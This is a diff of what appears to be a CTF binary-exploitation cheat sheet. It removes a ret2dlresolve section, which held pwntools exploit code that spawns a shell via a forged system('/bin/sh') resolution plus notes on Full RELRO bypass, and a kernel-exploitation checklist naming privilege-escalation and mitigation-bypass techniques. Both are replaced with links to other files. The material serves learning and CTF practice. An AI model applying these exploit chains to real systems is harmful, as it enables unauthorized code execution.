@@ -160,46 +160,7 @@ analyze_report(0)             # Calls dangling pointer -> win()
 
 ## ret2dlresolve
 
-**Pattern:** Forge `Elf64_Sym` and `Elf64_Rela` structures to trick the dynamic linker into resolving an arbitrary function (e.g., `system`) at the next PLT call. Bypasses ASLR without any libc leak.
-
-```python
-from pwn import *
-
-# pwntools has built-in ret2dlresolve support
-rop = ROP(elf)
-dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
-
-rop.read(0, dlresolve.data_addr)  # Read forged structures to known address
-rop.ret2dlresolve(dlresolve)       # Trigger resolution
-
-# Stage 1: Send ROP chain
-io.sendline(flat({offset: rop.chain()}))
-
-# Stage 2: Send forged dl-resolve payload
-io.sendline(dlresolve.payload)
-```
-
-**Manual approach (understanding the internals):**
-```python
-# Forge at a writable address (e.g., .bss)
-# 1. Fake Elf64_Rela: points PLT slot to our fake Elf64_Sym
-# 2. Fake Elf64_Sym: st_name offset points to our "system" string
-# 3. "system\x00" string
-
-SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
-STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
-JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')
-
-# Calculate reloc_index so PLT stub pushes correct index
-reloc_index = (fake_rela_addr - JMPREL) // 0x18  # sizeof(Elf64_Rela)
-
-# Fake Elf64_Sym.st_name = offset from STRTAB to our "system" string
-fake_sym_st_name = fake_string_addr - STRTAB
-```
-
-**Key insight:** ret2dlresolve works without ANY libc leak (Partial RELRO); the Full RELRO variant below needs an ld.so leak instead. It exploits the lazy binding mechanism: when a PLT function is called for the first time, the dynamic linker looks up the symbol name and resolves it. By forging the lookup structures, you can make it resolve any libc function. Use pwntools' `Ret2dlresolvePayload` for automation.
-
-**Requirements:** Partial RELRO (writable `.got.plt`, lazy binding intact), writable memory for the forged `Elf64_Sym`/`Rela`/string, and control of the reloc index. **Full RELRO kills the classic route, not the technique:** `BIND_NOW` zeroes the `GOT[1]`/`GOT[2]` slots and makes `.got.plt` read-only, but `_dl_runtime_resolve` still lives in `ld.so`. With an ld.so leak, call it yourself - `_dl_runtime_resolve(link_map, index)` with a `link_map*` recovered from `DT_DEBUG`/`_r_debug.r_map` - and point the forged `Elf64_Rela.r_offset` at **writable** memory, since the normal GOT write-back would fault. The resolver then tail-calls the resolved symbol, and the 64-bit `l_info[VERSYMIDX(DT_VERSYM)] = NULL` step still applies. Cost is one extra leak plus manual `_dl_fixup` setup instead of a PLT0 jump. See [T3stzer0 - ret2dlresolve from No RELRO to FULL RELRO](https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/).
+Forging `Elf64_Rela`/`Elf64_Sym`/dynstr so the linker resolves `system` - the 64-bit VERSYM-NULL step, the link_map `l_info` route, and the Full RELRO variant - is in [rop-advanced.md](rop-advanced.md#ret2dl_resolve-64-bit-codegate-2018). Use `Ret2dlresolvePayload` unless its gadget search fails; then build the chain by hand.
 
 ---
 
@@ -313,22 +274,7 @@ The concrete addresses in the worked example (`+0x20b040`, `+0x20b068`, `+0x20b0
 
 ## Kernel Exploitation
 
-For comprehensive kernel exploitation techniques, see [kernel.md](kernel.md). Quick reference:
-
-- `modprobe_path` overwrite for root code execution (requires AAW)
-- `tty_struct` kROP via fake vtable and stack pivot
-- `userfaultfd` for deterministic race conditions
-- Heap spray with `tty_struct`, `poll_list`, `user_key_payload`, `seq_operations`
-- KASLR/FGKASLR/SMEP/SMAP/KPTI bypass techniques
-- Kernel config recon checklist
-
-**Basic patterns (userland-adjacent):**
-- OOB via vulnerable `lseek` handlers
-- Heap grooming with forked processes
-- SUID binary exploitation via kernel-to-userland buffer overflow
-- Check kernel config for disabled protections:
-  - `CONFIG_SLAB_FREELIST_RANDOM=n` → sequential heap chunks
-  - `CONFIG_SLAB_MERGE_DEFAULT=n` → predictable allocations
+See [kernel.md](kernel.md) for setup/recon, object sprays and privilege-escalation primitives, and [kernel-bypass.md](kernel-bypass.md) for KASLR / SMEP / SMAP / KPTI.
 
 ---
 
